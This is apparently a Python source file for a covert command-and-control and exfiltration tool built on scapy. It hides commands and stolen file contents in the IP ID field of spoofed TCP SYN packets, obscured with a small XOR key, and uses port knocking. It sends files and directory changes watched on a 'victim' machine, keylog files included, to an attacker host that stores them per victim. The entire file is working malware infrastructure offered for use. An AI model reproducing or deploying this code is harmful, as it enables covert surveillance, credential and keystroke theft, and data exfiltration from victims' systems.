import shutil

from scapy.all import *
from scapy.layers.inet import *


def get_random_char():
    letters = string.ascii_letters
    return bytes(''.join(random.choice(letters) for _ in range(2)), 'ascii')


def xor_encrypt_decrypt(data_byte: int, key_bytes: bytes):
    """
    Performs XOR encryption on a single byte of data using a 2-byte key.
    :param data_byte: The byte of data to encrypt.
    :param key_bytes: The 2-byte encryption key.
    :return: The encrypted byte.
    """
    data_byte = data_byte.to_bytes(1, byteorder='big')
    if len(key_bytes) != 2:
        raise ValueError("Key must be a single byte (8 bits)")
    key = key_bytes * (len(data_byte) // 2) + key_bytes[:len(data_byte) % 2]
    encrypted_byte = bytes([data_byte[i] ^ key[i] for i in range(len(data_byte))])
    return int.from_bytes(encrypted_byte, 'big')


class CovertTCP:
    def __init__(self, cmd_addr, victim_addr, cmd_port, victim_port):
        self.cmd_addr = cmd_addr
        self.victim_addr = victim_addr
        if victim_port == 0:
            self.victim_port = random.randint(1, 65535)
        else:
            self.victim_port = victim_port
        self.cmd_port = cmd_port
        self.file_name = None
        self.cmd = None
        self.is_dir = False
        self.key = get_random_char()
        self.path = f"downloads/{self.victim_addr}"

    def port_knock(self):
        for _ in range(5):
            self.hsend('0'.encode(), self.cmd_addr, self.victim_addr, self.cmd_port,  100)
        for _ in range(5):
            self.hsend('0'.encode(), self.cmd_addr, self.victim_addr, self.cmd_port, 200)
        for _ in range(5):
            self.hsend('0'.encode(), self.cmd_addr, self.victim_addr, self.cmd_port, 300)

    def send_data(self, is_victim: bool, event=None):
        if is_victim:
            src_addr = self.cmd_addr
            src_port = self.cmd_port
            dst_addr = self.victim_addr
            dst_port = self.victim_port
        else:
            src_addr = self.victim_addr
            src_port = self.victim_port
            dst_addr = self.cmd_addr
            dst_port = self.cmd_port

        if self.cmd is not None:
            format_len_msg = "{:04d}".format(len(str(self.cmd)))
            data = f"0000{format_len_msg}{self.cmd}".encode()
            self.hsend(data, src_addr, dst_addr, src_port, dst_port)
        elif self.file_name and not self.is_dir:
            print(f"[SENDING] {self.file_name}")
            format_len_name = "{:02d}".format(len(self.file_name))
            if event == "IN_MOVE_SELF" or event == "IN_MOVED_FROM":
                data = f"11{format_len_name}0000{self.file_name}".encode()
                self.hsend(data, src_addr, dst_addr, src_port, dst_port)
                return
            if len(str(os.stat(self.file_name).st_size)) <= 4:
                format_len_msg = "{:04d}".format(os.stat(self.file_name).st_size)
            else:
                print(f"[ERROR]")
                exit()
            if event == "IN_MODIFY" or event == "IN_MOVED_TO" or event == "IN_CREATE":
                data = f"10{format_len_name}{format_len_msg}{self.file_name}".encode()
            try:
                data += open(self.file_name, "rb").read()
            except Exception as e:
                print(e)
            self.hsend(data, src_addr, dst_addr, src_port, dst_port)

        elif self.file_name and self.is_dir:
            format_len_name = "{:02d}".format(len(str(self.file_name)))
            if event == "IN_MODIFY" or event == "IN_MOVED_TO" or event == "IN_CREATE":
                data = f"20{format_len_name}0000{self.file_name}".encode()
            elif event == "IN_MOVE_SELF" or event == "IN_MOVED_FROM":
                data = f"21{format_len_name}0000{self.file_name}".encode()
            self.hsend(data, src_addr, dst_addr, src_port, dst_port)

    def receive_data(self, is_victim: bool, watching=True):
        is_file = self.get_packets(1, is_victim)[0]
        if is_file == '1':
            is_file = True
            is_dir = False
        elif is_file == '2':
            is_dir = True
            is_file = False
        else:
            is_file = False
            is_dir = False
        event = int("".join(self.get_packets(1, is_victim)))
        file_name_len = int("".join(self.get_packets(2, is_victim)))
        msg_len = int("".join(self.get_packets(4, is_victim)))
        msg = "".join(self.get_packets(msg_len + file_name_len, is_victim))
        if is_file:
            filename = msg[:file_name_len]
            if event:
                os.makedirs(os.path.dirname(self.path + f'/deleted/{filename}'), exist_ok=True)
                print(f"[File Deleted] {filename} moved to {self.path}/deleted/{filename}")
                shutil.move(self.path + f'/watching/{filename}', self.path + f'/deleted/{filename}',
                            copy_function=shutil.copy2)

            else:
                if filename == 'keylog.txt' or not watching:
                    filename = self.path + f'/{filename}'
                elif is_victim:
                    filename = filename
                else:
                    filename = self.path + f'/watching/{filename}'
            if not event:
                with open(filename, 'wb') as f:
                    f.write((msg[file_name_len:]).encode())
                print(f"[File Received] saved as {filename}")

        elif is_dir:
            fname = self.path + '/watching/' + msg
            if not event:
                os.makedirs(fname, exist_ok=True)
                print(f"[Directory Created] {fname}")
            elif event:
                os.rmdir(fname)
                os.makedirs(self.path + f'/deleted/{msg}', exist_ok=True)
                print(f"{fname} moved to {self.path}+/deleted/{msg}")
        else:
            return msg

    def get_packets(self, count: int, is_victim: bool):
        if is_victim:
            src_addr = self.cmd_addr
            dst_port = self.victim_port
        else:
            src_addr = self.victim_addr
            dst_port = self.cmd_port
        data = []

        def process_packet(incoming_packet):
            if not incoming_packet.haslayer(TCP) and not incoming_packet.haslayer(IP):
                return
            ch = chr(xor_encrypt_decrypt(incoming_packet[IP].id, self.key))
            data.append(ch)

        sniff(filter=f"dst port {dst_port} and src host {src_addr}", lfilter=lambda i: i[TCP].flags & 2,
              prn=process_packet, store=0,
              count=count)
        return data

    def hsend(self, data, src_addr, dst_addr, src_port, dst_port):
        for ch in data:
            ip_id = xor_encrypt_decrypt(ch, self.key)
            tcp_seq = random.randint(1, 10000)

            sr_packet = IP(src=src_addr, dst=dst_addr, id=ip_id) / TCP(sport=src_port,
                                                                       dport=dst_port,
                                                                       seq=tcp_seq,
                                                                       flags="S")
            time.sleep(0.05)
            send(sr_packet, verbose=False)

    def __str__(self):
        return f"src_ip:{self.cmd_addr}src_port:{self.cmd_port}::dst_ip:{self.victim_addr}:{self.victim_port}::" \
               f"filename:{self.file_name}::cmd:{self.cmd}::dir:{self.is_dir}"
